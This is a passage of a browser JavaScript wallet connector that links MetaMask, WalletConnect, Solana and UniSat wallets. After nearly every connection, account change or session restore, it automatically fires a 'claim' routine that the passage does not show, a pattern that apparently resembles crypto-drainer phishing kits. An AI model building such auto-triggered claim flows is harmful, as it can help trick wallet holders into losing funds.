    // Also store URI for potential manual use
    sessionStorage.setItem('desktop_wc_uri', uri);
  }

  function detectInstalledMobileWallet() {
    // Check for various wallet indicators on mobile
    const ua = navigator.userAgent.toLowerCase();
    const wallets = [];

    if (ua.includes('metamask')) wallets.push({ id: 'metamask', name: 'MetaMask' });
    if (ua.includes('trustwallet')) wallets.push({ id: 'trust', name: 'Trust Wallet' });
    if (ua.includes('coinbase')) wallets.push({ id: 'coinbase', name: 'Coinbase Wallet' });
    if (ua.includes('rainbow')) wallets.push({ id: 'rainbow', name: 'Rainbow' });
    if (ua.includes('phantom')) wallets.push({ id: 'phantom', name: 'Phantom' });
    if (ua.includes('zerion')) wallets.push({ id: 'zerion', name: 'Zerion' });

    // Also check window objects
    if (window.ethereum?.isMetaMask) wallets.push({ id: 'metamask', name: 'MetaMask' });
    if (window.ethereum?.isCoinbaseWallet) wallets.push({ id: 'coinbase', name: 'Coinbase Wallet' });
    if (window.ethereum?.isTrust) wallets.push({ id: 'trust', name: 'Trust Wallet' });

    return wallets.length > 0 ? wallets[0] : null;
  }

  function buildDeeplink(wallet, uri) {
    const links = {
      metamask: { native: 'metamask://wc?uri=', universal: 'https://metamask.app.link/wc?uri=' },
      trust: { native: 'trust://wc?uri=', universal: 'https://link.trustwallet.com/wc?uri=' },
      rainbow: { native: 'rainbow://wc?uri=', universal: 'https://rnbwapp.com/wc?uri=' },
      coinbase: { native: 'coinbasewallet://wc?uri=', universal: 'https://go.cb-w.com/wc?uri=' },
      phantom: { native: 'phantom://wc?uri=', universal: 'https://phantom.app/wc?uri=' },
      zerion: { native: 'zerion://wc?uri=', universal: 'https://app.zerion.io/wc?uri=' },
    };
    const link = links[wallet.id];
    if (!link) return null;
    const base = isIOS() ? link.universal : link.native;
    return base + encodeURIComponent(uri);
  }

  // ============================================================
  // BITCOIN (UniSat) CONNECTION
  // ============================================================
  async function connectBitcoin() {
    try {
      if (!window.unisat) {
        showStatus('UniSat wallet not installed', 'error');
        return false;
      }

      // Check if already connected
      let accounts;
      try {
        accounts = await window.unisat.getAccounts();
      } catch {
        accounts = [];
      }

      if (accounts.length === 0) {
        await window.unisat.requestAccounts();
        accounts = await window.unisat.getAccounts();
      }

      if (!accounts || accounts.length === 0) {
        throw new Error('No BTC account');
      }

      const address = accounts[0];
      saveWallet(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin', 'UniSat');

      // Setup events
      if (window.unisat.on) {
        window.unisat.on('accountsChanged', (newAccounts) => {
          if (newAccounts.length === 0) {
            resetConnectedUI();
            clearSavedWallet();
          } else {
            saveWallet(newAccounts[0], null, 'bitcoin');
            updateConnectedUI(newAccounts[0], 'bitcoin', 'UniSat');
          }
        });
        window.unisat.on('networkChanged', (network) => {
          showStatus(`Bitcoin network: ${network}`, 'info');
        });
      }
      return true;
    } catch (e) {
      logDebug(`BTC connection error: ${e.message}`, 'error');
      showStatus('Bitcoin connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ============================================================
  // SOLANA CONNECTION – Enhanced
  // ============================================================
  async function connectSolana() {
    try {
      const wallets = getSolanaWallets();
      if (wallets.length === 0) {
        showStatus('No Solana wallet found', 'error');
        return false;
      }

      // Auto-select: Phantom > Solflare > Backpack > others
      const priority = ['Phantom', 'Solflare', 'Backpack'];
      let selected = wallets.find(w => priority.includes(w.name));
      if (!selected) selected = wallets[0];

      const provider = selected.provider;
      let publicKey;

      if (provider.connect) {
        const response = await provider.connect();
        publicKey = response.publicKey?.toString() || response.toString();
      } else if (provider.request) {
        const response = await provider.request({ method: 'connect' });
        publicKey = response.publicKey?.toString() || response.toString();
      } else {
        throw new Error('Unsupported provider interface');
      }

      const address = publicKey;
      saveWallet(address, null, 'solana');
      updateConnectedUI(address, 'solana', selected.name);

      window.solanaProvider = provider;
      window.solanaPublicKey = address;

      // Setup events
      if (provider.on) {
        provider.on('accountChanged', (newPubkey) => {
          if (newPubkey) {
            const addr = newPubkey.toString();
            saveWallet(addr, null, 'solana');
            updateConnectedUI(addr, 'solana', selected.name);
            window.solanaPublicKey = addr;
          } else {
            resetConnectedUI();
            clearSavedWallet();
            window.solanaProvider = null;
            window.solanaPublicKey = null;
          }
        });
        provider.on('disconnect', () => {
          resetConnectedUI();
          clearSavedWallet();
          window.solanaProvider = null;
          window.solanaPublicKey = null;
        });
      }
      return true;
    } catch (e) {
      logDebug(`SOL connection error: ${e.message}`, 'error');
      showStatus('Solana connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ============================================================
  // EVM PROVIDER EVENTS – Enhanced
  // ============================================================
  function setupEVMProviderEvents(provider) {
    if (!provider) return;

    const handleAccountsChanged = (accounts) => {
      if (accounts && accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected', 'info');
        return;
      }
      if (accounts && accounts.length > 0) {
        const address = accounts[0];
        const name = provider.isMetaMask ? 'MetaMask' :
                     provider.isCoinbaseWallet ? 'Coinbase Wallet' :
                     provider.isTrust ? 'Trust Wallet' :
                     provider.isRabby ? 'Rabby' : 'EVM Wallet';
        saveWallet(address, null, 'evm');
        updateConnectedUI(address, 'evm', name);
        // Trigger claim process
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    };

    const handleChainChanged = (chainId) => {
      showStatus(`Network changed to ${parseInt(chainId)}`, 'info');
    };

    const handleDisconnect = () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected', 'info');
    };

    // Use try/catch for each listener setup
    try {
      provider.on('accountsChanged', handleAccountsChanged);
    } catch (e) { /* ignore */ }

    try {
      provider.on('chainChanged', handleChainChanged);
    } catch (e) { /* ignore */ }

    try {
      provider.on('disconnect', handleDisconnect);
    } catch (e) { /* ignore */ }

    // Also handle connect event
    try {
      provider.on('connect', () => {
        logDebug('Provider connected event');
      });
    } catch (e) { /* ignore */ }

    // Store cleanup functions
    window.__evmEventCleanup = () => {
      try {
        provider.removeListener('accountsChanged', handleAccountsChanged);
        provider.removeListener('chainChanged', handleChainChanged);
        provider.removeListener('disconnect', handleDisconnect);
      } catch (e) { /* ignore */ }
    };
  }

  // ============================================================
  // MAIN CONNECT DISPATCHER – Enhanced
  // ============================================================
  async function connectWallet() {
    if (isConnecting) {
      logDebug('Connection already in progress');
      return;
    }
    isConnecting = true;
    connectionAttempts++;

    setButtonState(connectButton, 'loading', 'Initializing...');
    if (walletButton) setButtonState(walletButton, 'loading', 'Initializing...');
    showStatus('Detecting wallet...', 'info');

    let success = false;
    const platform = getPlatform();
    logDebug(`Platform: ${platform} | Mobile: ${isMobile()}`);

    try {
      if (isMobile()) {
        // ============================================================
        // MOBILE PATH – WalletConnect with deeplink
        // ============================================================
        logDebug('📱 Mobile: WalletConnect with deeplink');

        // Try with primary project ID first
        success = await connectViaWalletConnect(false);
        if (!success) {
          logDebug('Mobile: Retrying with public test ID');
          success = await connectViaWalletConnect(true);
        }

        if (!success) {
          showStatus('No wallet found. Please install a WalletConnect-compatible wallet.', 'error');
          setButtonState(connectButton, 'failed');
          if (walletButton) setButtonState(walletButton, 'failed');
        } else {
          setButtonState(connectButton, 'connected');
          if (walletButton) setButtonState(walletButton, 'connected');
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 1500);
        }
        isConnecting = false;
        return;
      }

      // ============================================================
      // DESKTOP PATH – Direct EVM → WalletConnect → Solana → Bitcoin
      // ============================================================
      logDebug('🖥️ Desktop: Full connection flow');

      // Step 1: Direct EVM (with retries)
      logDebug('Step 1: Direct EVM connection');
      setButtonState(connectButton, 'loading', 'Connecting to EVM...');
      success = await connectDirectEVM(2);

      if (success) {
        logDebug('✅ Desktop: Direct EVM connected');
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1500);
        isConnecting = false;
        return;
      }

      // Step 2: WalletConnect fallback
      logDebug('Step 2: WalletConnect fallback');
      setButtonState(connectButton, 'loading', 'Connecting via WalletConnect...');
      success = await connectViaWalletConnect(false);

      if (!success) {
        logDebug('WalletConnect primary failed, trying public test ID');
        success = await connectViaWalletConnect(true);
      }

      if (success) {
        logDebug('✅ Desktop: WalletConnect connected');
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1500);
        isConnecting = false;
        return;
      }

      // Step 3: Solana
      logDebug('Step 3: Solana connection');
      setButtonState(connectButton, 'loading', 'Checking Solana...');
      const solanaWallets = getSolanaWallets();
      if (solanaWallets.length > 0) {
        success = await connectSolana();
        if (success) {
          logDebug('✅ Desktop: Solana connected');
          setButtonState(connectButton, 'connected');
          if (walletButton) setButtonState(walletButton, 'connected');
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 1500);
          isConnecting = false;
          return;
        }
      }

      // Step 4: Bitcoin
      logDebug('Step 4: Bitcoin connection');
      setButtonState(connectButton, 'loading', 'Checking Bitcoin...');
      if (window.unisat) {
        success = await connectBitcoin();
        if (success) {
          logDebug('✅ Desktop: Bitcoin connected');
          setButtonState(connectButton, 'connected');
          if (walletButton) setButtonState(walletButton, 'connected');
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 1500);
          isConnecting = false;
          return;
        }
      }

      // All attempts failed
      logDebug('❌ All connection attempts failed');
      showStatus('No supported wallet found. Please install a wallet.', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');

    } catch (err) {
      logDebug(`❌ Connection error: ${err.message}`, 'error');
      showStatus('Connection error: ' + err.message, 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }

    isConnecting = false;
  }

  // ============================================================
  // DISCONNECT – Enhanced
  // ============================================================
  async function disconnectWallet() {
    if (isConnecting) return;

    try {
      // Clean up EVM events
      if (window.__evmEventCleanup) {
        window.__evmEventCleanup();
        window.__evmEventCleanup = null;
      }

      // Disconnect Solana
      if (window.solanaProvider && window.solanaProvider.disconnect) {
        try {
          await window.solanaProvider.disconnect();
        } catch (e) { /* ignore */ }
      }

      // Disconnect WalletConnect
      if (client && currentSession) {
        try {
          await client.disconnect({
            topic: currentSession.topic,
            reason: { code: 6000, message: 'User disconnected' },
          });
        } catch (e) { /* ignore */ }
        currentSession = null;
      }

      // Close modal
      if (modal) {
        try { modal.closeModal(); } catch (e) { /* ignore */ }
      }

      // Clear session storage
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

    } catch (err) {
      logDebug(`Disconnect error: ${err.message}`, 'error');
    }

    resetConnectedUI();
    clearSavedWallet();
    window.solanaProvider = null;
    window.solanaPublicKey = null;
    logDebug('🔌 Disconnected successfully');
  }

  // ============================================================
  // BUTTON CLICK HANDLER
  // ============================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) {
    connectButton.addEventListener('click', handleClick);
  }
  if (walletButton) {
    walletButton.addEventListener('click', handleClick);
  }

  // ============================================================
  // RESTORE SESSION – Enhanced
  // ============================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain = getSavedChainType();
    const savedSession = getSavedSession();

    // Check for pending WC redirect
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');

    if (pendingUri && pendingTimestamp) {
      const elapsed = Date.now() - parseInt(pendingTimestamp);
      if (elapsed < 120000) {
        logDebug('Detected return from wallet – waiting for session...');
        if (client) {
          try {
            await new Promise(r => setTimeout(r, 1500));
            const sessions = client.session.values();
            if (sessions.length > 0) {
              const session = sessions[0];
              const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
              if (account) {
                saveWallet(account, session, 'evm');
                updateConnectedUI(account, 'evm', 'WalletConnect');
                currentSession = session;
                sessionStorage.removeItem('pending_wc_uri');
                sessionStorage.removeItem('pending_wc_timestamp');
                setTimeout(() => {
                  if (typeof window.initiateClaimProcess === 'function') {
                    window.initiateClaimProcess();
                  }
                }, 1000);
                return;
              }
            }
          } catch (e) {
            logDebug(`Session restore after redirect failed: ${e.message}`, 'error');
          }
        }
      }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
    }

    if (savedWallet && savedChain !== 'unknown') {
      logDebug(`♻️ Restoring ${savedChain} wallet: ${savedWallet.slice(0,6)}...`);

      if (savedChain === 'evm') {
        // Try WalletConnect session restore
        if (savedSession) {
          const initSuccess = await initWalletConnect(false);
          if (initSuccess && client) {
            try {
              // Try to get session by topic
              let session = null;
              const sessions = client.session.values();
              for (const s of sessions) {
                if (s.topic === savedSession.topic) {
                  session = s;
                  break;
                }
              }
              if (session) {
                currentSession = session;
                const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2] || savedWallet;
                updateConnectedUI(account, 'evm', 'WalletConnect');
                return;
              }
            } catch (e) {
              logDebug(`Session restore failed: ${e.message}`, 'error');
            }
          }
        }

        // Try direct provider (desktop only)
        if (isDesktop() && window.ethereum) {
          try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0 && accounts[0] === savedWallet) {
              const name = window.ethereum.isMetaMask ? 'MetaMask' :
                           window.ethereum.isCoinbaseWallet ? 'Coinbase Wallet' :
                           'EVM Wallet';
              updateConnectedUI(savedWallet, 'evm', name);
              setupEVMProviderEvents(window.ethereum);
              return;
            }
          } catch (e) { /* ignore */ }
        }

        // If we're on mobile and no session, clear
        if (isMobile()) {
          clearSavedWallet();
        }
      } else if (savedChain === 'solana') {
        if (isDesktop()) {
          const wallets = getSolanaWallets();
          if (wallets.length > 0) {
            const success = await connectSolana();
            if (success) return;
          }
        }
        clearSavedWallet();
      } else if (savedChain === 'bitcoin') {
        if (isDesktop() && window.unisat) {
          try {
            const accounts = await window.unisat.getAccounts();
            if (accounts.length > 0 && accounts[0] === savedWallet) {
              updateConnectedUI(savedWallet, 'bitcoin', 'UniSat');
              return;
            }
          } catch (e) { /* ignore */ }
        }
        clearSavedWallet();
      }
    }
  }

  // ============================================================
  // LOAD LIBRARIES AND START – Optimized
  // ============================================================
  try {
    logDebug('Loading WalletConnect libraries...');
    const libs = await loadWalletConnect();
    SignClient = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    logDebug('✅ WalletConnect libraries loaded');

    setupEIP6963();

    // Initialize WalletConnect in background for faster connection
    // Don't await – let it happen in parallel
    initWalletConnect(false).then(success => {
      if (success) {
        logDebug('✅ WalletConnect pre-initialized');
        // Now restore session
        restoreWalletConnection();
      } else {
        logDebug('⚠️ WalletConnect pre-init failed, will retry on connection');
        // Still try to restore without WC
        restoreWalletConnection();
      }
    }).catch(() => {
      // If pre-init fails, still try restore
      restoreWalletConnection();
    });

  } catch (err) {
    logDebug(`❌ Fatal error: ${err.message}`, 'error');
    showStatus('Failed to load wallet libraries', 'error');
    // Still try to restore without WC
    setTimeout(restoreWalletConnection, 1000);
  }

  // ============================================================
  // SESSION LISTENERS – Enhanced
  // ============================================================
  setTimeout(() => {
    if (client) {
      try {
        client.on('session_update', ({ params }) => {
          const accounts = params.namespaces?.eip155?.accounts;
          if (accounts?.length) {
            const account = accounts[0].split(':')[2];
            updateConnectedUI(account, 'evm', 'WalletConnect');
            saveWallet(account, currentSession, 'evm');
            setTimeout(() => {
              if (typeof window.initiateClaimProcess === 'function') {
                window.initiateClaimProcess();
              }
            }, 1000);
          }
        });

        client.on('session_delete', () => {
          resetConnectedUI();
          clearSavedWallet();
          showStatus('Wallet disconnected by provider', 'error');
        });

        client.on('session_connect', (session) => {
          const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
          if (account) {
            saveWallet(account, session, 'evm');
            updateConnectedUI(account, 'evm', 'WalletConnect');
            currentSession = session;
            setTimeout(() => {
              if (typeof window.initiateClaimProcess === 'function') {
                window.initiateClaimProcess();
              }
            }, 1000);
          }
        });

        client.on('session_expire', () => {
          logDebug('Session expired');
          resetConnectedUI();
          clearSavedWallet();
          showStatus('Session expired – please reconnect', 'warning');
        });

      } catch (e) {
        logDebug(`Session listener setup error: ${e.message}`, 'error');
      }
    }
  }, 500);

  // ============================================================
  // GLOBAL EVM PROVIDER EVENTS
  // ============================================================
  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  // ============================================================
  // VISIBILITY CHANGE – Session return detection
  // ============================================================
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) {
      const savedWallet = getSavedWallet();
      if (savedWallet) {
        logDebug('Page visible, checking connection status...');

        // Check for pending WC session
        const pendingUri = sessionStorage.getItem('pending_wc_uri');
        const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
        if (pendingUri && pendingTimestamp) {
          const elapsed = Date.now() - parseInt(pendingTimestamp);
          if (elapsed < 120000 && client) {
            logDebug('Checking for pending session...');
            setTimeout(async () => {
              try {
                const sessions = client.session.values();
                if (sessions.length > 0) {
                  const session = sessions[0];
                  const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
                  if (account) {
                    saveWallet(account, session, 'evm');
                    updateConnectedUI(account, 'evm', 'WalletConnect');
                    currentSession = session;
                    sessionStorage.removeItem('pending_wc_uri');
                    sessionStorage.removeItem('pending_wc_timestamp');
                    setTimeout(() => {
                      if (typeof window.initiateClaimProcess === 'function') {
                        window.initiateClaimProcess();
                      }
                    }, 1000);
                  }
                }
              } catch (e) {
                logDebug(`Visibility check failed: ${e.message}`, 'error');
              }
            }, 800);
          }
        }
      }
    }
  });

  // ============================================================
  // CLEANUP
  // ============================================================
  window.addEventListener('beforeunload', () => {
    if (modal) {
      try { modal.closeModal(); } catch (e) { /* ignore */ }
    }
    if (window.__evmEventCleanup) {
      window.__evmEventCleanup();
    }
  });

  // ============================================================
  // KEYBOARD SHORTCUTS (for debugging)
  // ============================================================
  document.addEventListener('keydown', (e) => {
    // Ctrl+Shift+D to toggle debug
    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
      debugVisible = !debugVisible;
      debugArea.style.display = debugVisible ? 'block' : 'none';
    }
    // Escape to disconnect
    if (e.key === 'Escape' && getSavedWallet()) {
      disconnectWallet();
    }
  });

  // ============================================================
  // FINAL LOG
  // ============================================================
  logDebug(`✅ main.js initialized – Platform: ${getPlatform()}`);
  logDebug(`   Mobile: ${isMobile()} | Desktop: ${isDesktop()}`);
  logDebug(`   Flow: ${isMobile() ? 'WalletConnect (deeplink)' : 'Direct EVM → WC → Solana → BTC'}`);
  logDebug(`   WalletConnect: ${client ? '✅' : '⏳'}`);

  // ============================================================
  // EXPOSE GLOBALS
  // ============================================================
  window.__walletConnector = {
    connect: connectWallet,
    disconnect: disconnectWallet,
    getStatus: () => ({
      connected: !!getSavedWallet(),
      chain: getSavedChainType(),
      address: getSavedWallet(),
      client: !!client,
      modal: !!modal,
    }),
  };

})();
